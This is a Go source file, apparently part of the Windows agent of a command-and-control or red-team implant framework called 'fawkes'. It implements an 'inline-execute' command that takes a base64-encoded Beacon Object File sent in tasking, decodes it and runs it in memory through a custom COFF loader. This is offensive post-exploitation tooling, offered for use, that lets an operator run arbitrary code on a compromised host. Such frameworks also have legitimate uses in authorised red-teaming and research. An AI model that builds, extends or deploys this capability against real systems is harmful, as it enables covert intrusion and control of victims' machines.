//go:build windows
// +build windows

package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"

	"fawkes/pkg/structs"
)

// InlineExecuteCommand implements the inline-execute command for BOF/COFF execution
type InlineExecuteCommand struct{}

// Name returns the command name
func (c *InlineExecuteCommand) Name() string {
	return "inline-execute"
}

// Description returns the command description
func (c *InlineExecuteCommand) Description() string {
	return "Execute a Beacon Object File (BOF/COFF) in memory"
}

// InlineExecuteParams represents the parameters for inline-execute
type InlineExecuteParams struct {
	BOFB64     string   `json:"bof_b64"`     // Base64-encoded BOF bytes
	EntryPoint string   `json:"entry_point"` // Entry point function name
	Arguments  []string `json:"arguments"`   // Arguments in format: ["zvalue", "i80"]
}

// Execute executes the inline-execute command
func (c *InlineExecuteCommand) Execute(task structs.Task) structs.CommandResult {
	// Parse parameters
	var params InlineExecuteParams
	err := json.Unmarshal([]byte(task.Params), &params)
	if err != nil {
		return errorf("Error parsing parameters: %v\nRaw params: %s", err, task.Params)
	}

	// Validate BOF data
	if params.BOFB64 == "" {
		return errorResult("Error: No BOF data provided")
	}

	// Decode the base64-encoded BOF
	bofBytes, err := base64.StdEncoding.DecodeString(params.BOFB64)
	if err != nil {
		return errorf("Error decoding BOF data: %v", err)
	}

	if len(bofBytes) == 0 {
		return errorResult("Error: BOF data is empty")
	}

	// Pack the arguments using our custom PackArgs (fixes GC issues in goffloader)
	var argBytes []byte
	if len(params.Arguments) > 0 {
		argBytes, err = PackArgs(params.Arguments)
		if err != nil {
			return errorf("Error packing BOF arguments: %v", err)
		}
	}

	// Execute the BOF using our custom loader with fixed Beacon API
	entryPoint := params.EntryPoint
	if entryPoint == "" {
		entryPoint = "go"
	}

	bofOutput, err := LoadAndRunBOF(bofBytes, argBytes, entryPoint)

	// Check for execution errors
	if err != nil {
		output := fmt.Sprintf("Error executing BOF: %v", err)
		if bofOutput != "" {
			output += fmt.Sprintf("\n\nBOF Output:\n%s", bofOutput)
		}
		return errorResult(output)
	}

	// Clean up the output (remove trailing newlines)
	bofOutput = strings.TrimSpace(bofOutput)

	// Return the BOF output
	if bofOutput == "" {
		bofOutput = "[+] BOF executed successfully (no output)"
	}

	return successResult(bofOutput)
}
